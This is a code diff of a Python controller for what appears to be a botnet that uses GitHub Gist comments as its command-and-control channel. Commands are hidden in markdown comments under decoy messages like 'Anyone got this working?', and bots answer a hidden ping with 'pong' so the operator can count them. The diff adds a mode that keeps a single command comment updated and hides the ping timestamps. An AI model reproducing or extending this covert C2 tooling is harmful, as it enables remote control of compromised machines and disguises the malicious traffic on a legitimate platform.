@@ -1,12 +1,11 @@
 #! /bin/python3
 import argparse
-from datetime import datetime
 import sys
 import threading
 import time
 import requests
 from dotenv import dotenv_values
-from utils import create_markdown_comment, get_random_message, parse_markdown_comment
+from utils import create_markdown_comment, get_comment_text, get_markdown_timestamp, get_random_message, parse_markdown_comment
 
 parser = argparse.ArgumentParser(
     prog='controller.py',
@@ -26,7 +25,7 @@ parser.add_argument('-d', '--delete', help="Delete all comments",
 
 args = parser.parse_args()
 
-if(github_token is None):
+if(github_token is None or args.token is not None):
     github_token = args.token
 
 gist_id = args.gistId
@@ -37,7 +36,7 @@ headers = {"authorization": f'bearer {github_token}'}
 gist_response = requests.get(gist_url, headers=headers)
 gist = gist_response.json()
 state = {"last_update": gist['updated_at'],
-         "bot_count": 'checking...'}
+         "bot_count": 'checking...', "command_comment": None, "ping_comment": None, "command_text": None, "ping_text": None}
 
 try:
     print(f"Channel url: {gist['url']}")
@@ -48,6 +47,9 @@ except KeyError:
 
 def get_comments(latest_only=False):
     comments = requests.get(comments_url, headers=headers).json()
+    comments.sort(
+        key=lambda comment: comment['updated_at'])
+
     if latest_only:
         comments = list(filter(
             lambda comment: comment['updated_at'] > state['last_update'], comments))
@@ -64,20 +66,39 @@ def print_comments(latest_only=False, commands_only=False):
         print(card)
 
 
-def post_comment(message, silent=False):
+def post_comment(message):
     response = requests.post(
         comments_url, json={"body": message}, headers=headers)
-    state["last_update"] = response.json()['updated_at']
-    if not silent:
-        print(response)
+
     return response
 
 
-def update_comment(comment_id, message, silent=False):
+def post_command(command):
+    def get_message():
+        state['command_text'] = state['command_text'] if state['command_text'] is not None else get_random_message()
+        return f"{state['command_text']}\n\n{get_markdown_timestamp()}\n\n{create_markdown_comment(command)}"
+    command_comment = state['command_comment']
+
+    if command_comment is None:
+        response = post_comment(get_message())
+        state['command_comment'] = response.json()
+        return response
+
+    response = requests.get(
+        f'{comments_url}/{command_comment["id"]}', headers=headers)
+
+    if(response.status_code == 404):
+        state['command_comment'] = None
+        return post_command(command)
+
+    update_comment(
+        comment_id=command_comment['id'], message=get_message())
+    return response
+
+
+def update_comment(comment_id, message):
     response = requests.patch(
         f'{comments_url}/{comment_id}', json={"body": message}, headers=headers)
-    if not silent:
-        print(response)
     return response
 
 
@@ -94,13 +115,16 @@ def prompt(message="$ "):
 
 def ping_bots():
     def get_message():
-        return f"{get_random_message(['Anyone got this working?','Is this up to date?'])}\n\n<!-- {datetime.now()} -->\n\n{create_markdown_comment('ping')}"
+        state['ping_text'] = state['ping_text'] if state['ping_text'] is not None else get_random_message(
+            ['Anyone got this working?', 'Is this up to date?'])
 
-    ping_comment = post_comment(
-        get_message(), silent=True).json()
+        return f"{state['ping_text']}\n\n{get_markdown_timestamp()}\n\n{create_markdown_comment('ping')}"
+
+    state['ping_comment'] = post_comment(get_message()).json()
 
     while True:
         time.sleep(8)
+        ping_comment = state['ping_comment']
         comments = get_comments()
         comments = filter(
             lambda comment: comment['updated_at'] > ping_comment['updated_at'], comments)
@@ -109,8 +133,8 @@ def ping_bots():
         bot_count = len(
             list(filter(lambda command: command == 'pong', list(commands))))
         state['bot_count'] = bot_count
-        ping_comment = update_comment(
-            comment_id=ping_comment['id'], message=get_message(), silent=True).json()
+        state['ping_comment'] = update_comment(
+            comment_id=ping_comment['id'], message=get_message()).json()
 
 
 if args.delete:
@@ -120,11 +144,12 @@ if args.delete:
         response = delete_comment(comment['id'])
         print(response)
 
-bot_check_thread = threading.Thread(
-    target=ping_bots, daemon=True)
-bot_check_thread.start()
+threading.Thread(
+    target=ping_bots, daemon=True).start()
 
 while True:
+    if state['command_comment'] is not None:
+        state['last_update'] = state['command_comment']['updated_at']
     command = prompt(f"[bots: {state['bot_count']}] $ ")
     match command:
         case 'comments':
@@ -141,7 +166,15 @@ while True:
         case 'post':
             comment = prompt("> Write comment: ")
             command = prompt("> Submit command: ")
-            post_comment(f'{comment}\n\n{create_markdown_comment(command)}')
+            response = post_comment(
+                f'{comment}\n\n{create_markdown_comment(command)}')
+            print(response)
+
+        case 'command':
+            command = prompt("> Submit command: ")
+            response = post_command(command)
+            print(response)
+
         case 'bots':
             print(f'> bot count: {state["bot_count"]}')
         case 'exit':
